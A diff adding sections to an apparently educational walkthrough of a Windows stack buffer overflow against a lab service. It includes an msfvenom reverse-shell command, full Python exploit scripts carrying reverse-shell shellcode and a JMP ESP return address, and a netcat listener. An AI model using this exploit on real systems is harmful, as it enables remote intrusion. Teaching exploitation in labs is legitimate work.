@@ -166,7 +166,7 @@ The main parts composing the string to inject are:
 - **offset**: this is the effective distance between buffer start and return address within the stack.
 - **overflow**: the series of characters that will overflow the buffer.
 - **retn**: the value we want to write within the EIP, that is the value that will overwrite the return address within the stack frame.
-- **padding**: it is used to <ins>make room between the effective malicious code and the return address. The reason of adding a padding, that is composed by a set of NOP (No OPeration statement), is that the payload we're gonna try to execute could not be placed exactly near the return address because of memory allocation. Using a NOP Sled will allow us to execute our exploit more reliably.<ins>
+- **padding**: it is used to <ins>make room between the effective malicious code and the return address. The reason of adding a padding, that is composed by a set of NOP (No OPeration statement), is that the payload we're gonna try to execute could not be placed exactly near the return address because of memory allocation. Using a NOP Sled will allow us to execute our exploit more reliably.</ins>
 - **payload**: the effective malicious code to be executed by the processor. It is made by hexadecimal values that represent assembly code. 
 
 Executing this script with the cyclic pattern as payload will crash the server and overwrite the return address with a 4 byte substring from that.
@@ -203,10 +203,369 @@ Executing exploit.py and then analysing the EIP register, we can correctly find 
 
 ### Badchars discovery.
 
+Before we get into writing the shellcode, there is one last argument to treat: *badchars*. 
+Badchars are those characters that will be filtered out by the function reading the input value (e.g. strcpy, scanf, etc): <ins> these values will not be able to reach the memory after the injection</ins>, so we need to figure out which they are in order to write a shellcode that does not contain them.
+
+We can accomplish this task following five simple steps:
+1. Generating a *bytearray*, that is <ins>an array that contains every character other than the badchars found so far</ins>, with the Mona script for Immunity Debugger. 
+2. Generate the same bytearray to inject as the payload.
+3. After executing the exploit with the bytearray, <ins>compare the injected bytearray with the one generated previously to find the first byte that is missing</ins>.
+4. If, there some missing character, hence some badchar is resulting, go to 1 and generate the bytearray without the first badchar found.
+5. If the bytearray in memory and the one generated with Mona are the same, all the badchars have been identified.
+
+
+That said, let's see how to generate a bytearray with Mona.
+
+```bash
+!mona bytearray -b "\x00"
+```
+
+This command will generate a bytearray that contains all characters but `\x00`, that is the so called *null byte*, also known for being the *string terminator*.
+
+![Mona, bytearray](images/mona-bytearray.png)
+
+We can generate the same bytearray generated with Mona locally with a simple python script called **bytearray_generator.py** that takes as input the list of badchars, separated by whitespaces.
+
+```python3
+# importing sys to pass badchars to not print.
+import sys
+
+goodchars = 0
+badchars = "\\x00"
+print("bytearray:\n")
+for x in range(1, 256):
+	# :02 says to print x as 2 digits in hex
+	if "{:02x}".format(x) not in sys.argv:
+  		print("\\x" + "{:02x}".format(x), end='')
+  		goodchars += 1
+	else:
+  		badchars += "\\x"+"{:02x}".format(x)
+print()
+print("\nbadchars not printed: " + (str) (x - goodchars + 1 ))
+print("\nbadchars: " + badchars)
+```
+
+The first bytearray_generator.py call will be as follows
+
+![bytearray_generator, bytearray](images/bytearray_generator-bytearray.png)
+
+With this bytearray, we can modify the **exploit.py** script as follows
+
+```python3
+import socket
+
+ip = "10.10.116.35"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+# Little Endian --> because it has to be pushed within the stack and will be popped out from the least significant byte.
+retn = ""
+# NOP Sled 
+padding = ""
+# Cyclic pattern / Bytearray (badchars: \x00) / Shellcode
+# badchars for OVERFLOW1 \x00
+payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+```
+
+Last thing we need to learn is how to compare the injected bytearray with the one generated by Mona: this can be accomplished by executing the following Mona command within Immunity Debugger
+
+```bash
+!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
+```
+
+One of the key points here is: **why to compare the bytearray.bin, that is the byterray generated with Mona, with the content of the ESP, that is the address of the head of the stack?**  
+
+This question can be answered by <ins>keeping in mind how the stack works</ins>: **when an assembly subfunction ends its execution, its stack frame is popped out from the stack, so the Stack Pointer (ESP) will point to the new “head of the stack”. Since we have placed our bytearray after the return address, starting from the previous subfunction stack frame, the ESP will point exactly there!**
+
+![Bytearray within the memory](https://github.com/marcourbano/Stack-Buffer-Overflow-Guide/assets/22402683/64d1f02e-7861-42b6-afa6-78307ed0d45a)
+
+The result of the previous mona compare command will be shown within the “Log data” window: in this case, the first badchar found is \x07.
+
+![Mona, comparison bytearray](images/mona-bytearray_comparison.png)
+
+This procedure shall be repeated until no badchars are found, like the screenshot below.
+
+![Mona, no badchars](images/mona-bytearray_no_bad_chars.png)
+
 ### Generating shellcode.
+
+When all the bachars are identified, it's time to craft the *shellcode*[^2]: we can make it ourselves, writing it in assembly, or generate it with some useful tool such as `msfvenom`.
+
+Since we're writing our shellcode after the return address, <ins>we've not length constraints</ins>, so we can execute the following msfvenom statement, crafting a *Windows reverse shell*, C encoded, giving us back a shell on port 4444. 
+
+```bash
+# The badchars here are 00 07 2E A0
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.206.203 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+```
+
+The resulting exploit.py, with our shellcode as payload, will look like the following
+
+```python3
+import socket
+
+ip = "10.10.116.35"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+# Little Endian  --> because it has to be pushed within the stack and will be popped out from the least significant byte.
+retn = "ABBA"
+# NOP Sled x16
+padding = "\x90" * 16
+# Cyclic pattern / Bytearray (badchars: \x00) / Shellcode
+# badchars for OVERFLOW1 \x00\x07\x2e\xa0
+payload = ("\xdb\xcc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbd\x1d\xb9"
+"\x0d\xf9\x31\x6a\x17\x83\xea\xfc\x03\x77\xaa\xef\x0c\x7b"
+"\x24\x6d\xee\x83\xb5\x12\x66\x66\x84\x12\x1c\xe3\xb7\xa2"
+"\x56\xa1\x3b\x48\x3a\x51\xcf\x3c\x93\x56\x78\x8a\xc5\x59"
+"\x79\xa7\x36\xf8\xf9\xba\x6a\xda\xc0\x74\x7f\x1b\x04\x68"
+"\x72\x49\xdd\xe6\x21\x7d\x6a\xb2\xf9\xf6\x20\x52\x7a\xeb"
+"\xf1\x55\xab\xba\x8a\x0f\x6b\x3d\x5e\x24\x22\x25\x83\x01"
+"\xfc\xde\x77\xfd\xff\x36\x46\xfe\xac\x77\x66\x0d\xac\xb0"
+"\x41\xee\xdb\xc8\xb1\x93\xdb\x0f\xcb\x4f\x69\x8b\x6b\x1b"
+"\xc9\x77\x8d\xc8\x8c\xfc\x81\xa5\xdb\x5a\x86\x38\x0f\xd1"
+"\xb2\xb1\xae\x35\x33\x81\x94\x91\x1f\x51\xb4\x80\xc5\x34"
+"\xc9\xd2\xa5\xe9\x6f\x99\x48\xfd\x1d\xc0\x04\x32\x2c\xfa"
+"\xd4\x5c\x27\x89\xe6\xc3\x93\x05\x4b\x8b\x3d\xd2\xac\xa6"
+"\xfa\x4c\x53\x49\xfb\x45\x90\x1d\xab\xfd\x31\x1e\x20\xfd"
+"\xbe\xcb\xe7\xad\x10\xa4\x47\x1d\xd1\x14\x20\x77\xde\x4b"
+"\x50\x78\x34\xe4\xfb\x83\xdf\x01\xf4\x45\xd4\x7e\x06\x59"
+"\xfa\x22\x8f\xbf\x96\xca\xd9\x68\x0f\x72\x40\xe2\xae\x7b"
+"\x5e\x8f\xf1\xf0\x6d\x70\xbf\xf0\x18\x62\x28\xf1\x56\xd8"
+"\xff\x0e\x4d\x74\x63\x9c\x0a\x84\xea\xbd\x84\xd3\xbb\x70"
+"\xdd\xb1\x51\x2a\x77\xa7\xab\xaa\xb0\x63\x70\x0f\x3e\x6a"
+"\xf5\x2b\x64\x7c\xc3\xb4\x20\x28\x9b\xe2\xfe\x86\x5d\x5d"
+"\xb1\x70\x34\x32\x1b\x14\xc1\x78\x9c\x62\xce\x54\x6a\x8a"
+"\x7f\x01\x2b\xb5\xb0\xc5\xbb\xce\xac\x75\x43\x05\x75\x95"
+"\xa6\x8f\x80\x3e\x7f\x5a\x29\x23\x80\xb1\x6e\x5a\x03\x33"
+"\x0f\x99\x1b\x36\x0a\xe5\x9b\xab\x66\x76\x4e\xcb\xd5\x77"
+"\x5b")
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+```
+
+As shown in the script above, **we've prepended a set of `0x90` char byte to the shellcode**: this char will be interpreted by the processor as `No Operation` and will simply make it proceed to the next instruction.
+This set of NOP statements is called a *NOP Sled* and <ins>it is used to make the exploit more reliable, since there could be some space between the start of the shellcode and the address that we will hardcode within the return address slot</ins>
+
+
 
 ### Pointing to the shellcode.
 
+The last piece of the puzzle here is to figure out **how to find the address to our payload**. 
+Since we're placing our payload after the return address, it will end within the previous stack frame: **<ins>when the current function exits, the stack frame is removed from the top of the stack and the new top of the stack will contain exactly the malicious payload formed by NOP Sled plus shellcode!</ins>**
+
+
+But how can we obtain the address of the top of the stack, the one contained within ESP?
+The first key point to keep in mind is that we don't know what value ESP will have at that point, <ins>because of stack ASLR and because a different depth of call stack leading up to this point could change the address: so we can't hard-code a correct return address.</ins>
+
+![image](https://github.com/marcourbano/Stack-Buffer-Overflow-Guide/assets/22402683/ae65bc23-ebee-4951-a366-e9dec4b5dcfb)
+
+**The way to make the processor execute the istructions of the malicious payload is to find some `JMP ESP` or `CALL ESP` istruction at fixed memory addresses (not ASLRed) and to hardcode that istruction address within the return address to be overwritten.**
+
+This can be performed within Immunity Debugger with the Mona script, executing the following command
+
+```bash
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+```
+
+This command will find any `JMP ESP` bytes that does not contain the badchars (keep in mind that if any, the entire payload would not work).
+
+![](images/mona-find_jmp_esp_bytes.png)
+
+As showed by the image above, there is a set of **9 pointers to `JMP ESP` istruction**, but let's have a closer look: these addresses belong to a **DLL (Dynamic Linked Library)** named essfunc.dll and **the ASLR is disabled**. 
+
+**It is interesting to note that some DLLs could have the ASLR disabled and would be allocated within a [preferred base address](https://www.mandiant.com/resources/blog/six-facts-about-address-space-layout-randomization-on-windows), that is predictable!**
+
+We can now chose one address among the 9 found, let's say `625011C7`, and place it within the `retn` variable from our **exploit.py** script: since these values will be written within the stack and will be popped out from the last to the first (*FILO*), we must write it in *little-endian* (the least significant byte comes first).
+
+```python3
+import socket
+
+ip = "10.10.116.35"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+# Little Endian (was 625011C7) --> because it has to be pushed within the stack and will be popped out from the least significant byte.
+retn = "\xc7\x11\x50\x62"
+# NOP Sled x16
+padding = "\x90" * 16
+# Cyclic pattern / Bytearray (badchars: \x00) / Shellcode
+# badchars for OVERFLOW1 \x00\x07\x2e\xa0
+payload = ("\xdb\xcc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbd\x1d\xb9"
+"\x0d\xf9\x31\x6a\x17\x83\xea\xfc\x03\x77\xaa\xef\x0c\x7b"
+"\x24\x6d\xee\x83\xb5\x12\x66\x66\x84\x12\x1c\xe3\xb7\xa2"
+"\x56\xa1\x3b\x48\x3a\x51\xcf\x3c\x93\x56\x78\x8a\xc5\x59"
+"\x79\xa7\x36\xf8\xf9\xba\x6a\xda\xc0\x74\x7f\x1b\x04\x68"
+"\x72\x49\xdd\xe6\x21\x7d\x6a\xb2\xf9\xf6\x20\x52\x7a\xeb"
+"\xf1\x55\xab\xba\x8a\x0f\x6b\x3d\x5e\x24\x22\x25\x83\x01"
+"\xfc\xde\x77\xfd\xff\x36\x46\xfe\xac\x77\x66\x0d\xac\xb0"
+"\x41\xee\xdb\xc8\xb1\x93\xdb\x0f\xcb\x4f\x69\x8b\x6b\x1b"
+"\xc9\x77\x8d\xc8\x8c\xfc\x81\xa5\xdb\x5a\x86\x38\x0f\xd1"
+"\xb2\xb1\xae\x35\x33\x81\x94\x91\x1f\x51\xb4\x80\xc5\x34"
+"\xc9\xd2\xa5\xe9\x6f\x99\x48\xfd\x1d\xc0\x04\x32\x2c\xfa"
+"\xd4\x5c\x27\x89\xe6\xc3\x93\x05\x4b\x8b\x3d\xd2\xac\xa6"
+"\xfa\x4c\x53\x49\xfb\x45\x90\x1d\xab\xfd\x31\x1e\x20\xfd"
+"\xbe\xcb\xe7\xad\x10\xa4\x47\x1d\xd1\x14\x20\x77\xde\x4b"
+"\x50\x78\x34\xe4\xfb\x83\xdf\x01\xf4\x45\xd4\x7e\x06\x59"
+"\xfa\x22\x8f\xbf\x96\xca\xd9\x68\x0f\x72\x40\xe2\xae\x7b"
+"\x5e\x8f\xf1\xf0\x6d\x70\xbf\xf0\x18\x62\x28\xf1\x56\xd8"
+"\xff\x0e\x4d\x74\x63\x9c\x0a\x84\xea\xbd\x84\xd3\xbb\x70"
+"\xdd\xb1\x51\x2a\x77\xa7\xab\xaa\xb0\x63\x70\x0f\x3e\x6a"
+"\xf5\x2b\x64\x7c\xc3\xb4\x20\x28\x9b\xe2\xfe\x86\x5d\x5d"
+"\xb1\x70\x34\x32\x1b\x14\xc1\x78\x9c\x62\xce\x54\x6a\x8a"
+"\x7f\x01\x2b\xb5\xb0\xc5\xbb\xce\xac\x75\x43\x05\x75\x95"
+"\xa6\x8f\x80\x3e\x7f\x5a\x29\x23\x80\xb1\x6e\x5a\x03\x33"
+"\x0f\x99\x1b\x36\x0a\xe5\x9b\xab\x66\x76\x4e\xcb\xd5\x77"
+"\x5b")
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+
+```
+
 ### Exploitation: fun and profit ;-)
 
+Before executing the exploit, the last thing to do is to listen for the shell with `netcat`
+
+```bash
+nc -nlvp 4444
+```
+
+The result of the execution of the exploit is showed by the image below.
+
+![Exploitation](images/exploitation.png)
+
+## Bonus content
+
+### Trying to exploit the simple stack smashing technique, and failing.
+
+The technique shown in this article is not the so called *simple stack smashing* one, that is injecting the malicious shellcode and <ins>redirecting the program execution to it by hardcoding an address that will likely be in the middle of the NOP Sled</ins>.
+
+![classic buffer overflow](images/classic_buffer_overflow.png)
+
+We can explain why this technique would not work by first describing what is the **Address Space Layout Randomization (ASLR)** and later trying to exploit it and showing that it does not work, by examining the memory behaviour.
+
+The [Address Space Layout Randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is a technology used to **randomize the memory addresses that are assigned to a process**: it will prevent shellcode execution because the attacker cannot predict its exact memory location. 
+
+We wrote an **exploit2.py** script that builds up the same payload showed in the image above.
+
+```python3
+import socket
+
+ip = "10.10.73.27"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+# Little Endian (was 019FF268) --> because it has to be pushed within the stack and will be popped out from the least significant byte.
+retn = "\x68\xf4\x9f\x01"
+# NOP Sled will be 1627 bytes, since the payload is 351 bytes (offset - payload length).
+padding = "\x90" * 1627
+# Cyclic pattern / Bytearray (badchars: \x00) / Shellcode
+# badchars for OVERFLOW1 \x00\x07\x2e\xa0
+payload = ("\xdb\xcc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbd\x1d\xb9"
+"\x0d\xf9\x31\x6a\x17\x83\xea\xfc\x03\x77\xaa\xef\x0c\x7b"
+"\x24\x6d\xee\x83\xb5\x12\x66\x66\x84\x12\x1c\xe3\xb7\xa2"
+"\x56\xa1\x3b\x48\x3a\x51\xcf\x3c\x93\x56\x78\x8a\xc5\x59"
+"\x79\xa7\x36\xf8\xf9\xba\x6a\xda\xc0\x74\x7f\x1b\x04\x68"
+"\x72\x49\xdd\xe6\x21\x7d\x6a\xb2\xf9\xf6\x20\x52\x7a\xeb"
+"\xf1\x55\xab\xba\x8a\x0f\x6b\x3d\x5e\x24\x22\x25\x83\x01"
+"\xfc\xde\x77\xfd\xff\x36\x46\xfe\xac\x77\x66\x0d\xac\xb0"
+"\x41\xee\xdb\xc8\xb1\x93\xdb\x0f\xcb\x4f\x69\x8b\x6b\x1b"
+"\xc9\x77\x8d\xc8\x8c\xfc\x81\xa5\xdb\x5a\x86\x38\x0f\xd1"
+"\xb2\xb1\xae\x35\x33\x81\x94\x91\x1f\x51\xb4\x80\xc5\x34"
+"\xc9\xd2\xa5\xe9\x6f\x99\x48\xfd\x1d\xc0\x04\x32\x2c\xfa"
+"\xd4\x5c\x27\x89\xe6\xc3\x93\x05\x4b\x8b\x3d\xd2\xac\xa6"
+"\xfa\x4c\x53\x49\xfb\x45\x90\x1d\xab\xfd\x31\x1e\x20\xfd"
+"\xbe\xcb\xe7\xad\x10\xa4\x47\x1d\xd1\x14\x20\x77\xde\x4b"
+"\x50\x78\x34\xe4\xfb\x83\xdf\x01\xf4\x45\xd4\x7e\x06\x59"
+"\xfa\x22\x8f\xbf\x96\xca\xd9\x68\x0f\x72\x40\xe2\xae\x7b"
+"\x5e\x8f\xf1\xf0\x6d\x70\xbf\xf0\x18\x62\x28\xf1\x56\xd8"
+"\xff\x0e\x4d\x74\x63\x9c\x0a\x84\xea\xbd\x84\xd3\xbb\x70"
+"\xdd\xb1\x51\x2a\x77\xa7\xab\xaa\xb0\x63\x70\x0f\x3e\x6a"
+"\xf5\x2b\x64\x7c\xc3\xb4\x20\x28\x9b\xe2\xfe\x86\x5d\x5d"
+"\xb1\x70\x34\x32\x1b\x14\xc1\x78\x9c\x62\xce\x54\x6a\x8a"
+"\x7f\x01\x2b\xb5\xb0\xc5\xbb\xce\xac\x75\x43\x05\x75\x95"
+"\xa6\x8f\x80\x3e\x7f\x5a\x29\x23\x80\xb1\x6e\x5a\x03\x33"
+"\x0f\x99\x1b\x36\x0a\xe5\x9b\xab\x66\x76\x4e\xcb\xd5\x77"
+"\x5b")
+postfix = ""
+
+# Buffer to be used with the JMP ESP return address, because the payload will be placed after it, on the top of the old stack frame.
+#buffer = prefix + overflow + retn + padding + payload + postfix
+
+# Buffer to be used with the address of a NOP istruction found in memory after the first crash. The retn address value will point directly within the overflowed buffer. (NO ASLR).
+buffer = prefix + padding + payload + retn
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+
+```
+Considering that the offset is `1978`, we crash the server and insert `ABBA` within the return address.
+
+![abba clasic](images/immunity_debugger-classic_buffer_overflow_ABBA.png)
+
+After crashing the server, the return address will contain `ABBA`, as expected, but our focus here is to the `EAX` register: if we follow it on the stack, we can visualize the data injected. 
+The thing that is easily visible, is the NOP Sled after the “OVERFLOW 1” prefix: to replicate the tecnique discussed above, we take an address from the NOP Sled and hardcode it within the return address. 
+
+**It should lead the execution to the shellcode, right?**
+
+![classic buffer overflow failed](images/immunity_debugger-classic_buffer_overflow_failed.png)
+
+It doesn't work, in fact the stack frame has been allocated to another address, because of the Address Space Layout Randomization.
+
+**That's all, fellows Hackers!**
+
 [^1]: When the function ends, restoring the "functional context” of the previous function means to pop the SFP and to set it as the EBP value and to set EIP as the Return Address.
+[^2]: It is called the shellcode because the encoded assembly code often returns a shell to the attacker, but it can perform every action (e.g. inserting a root user within the /usr/shadow file).
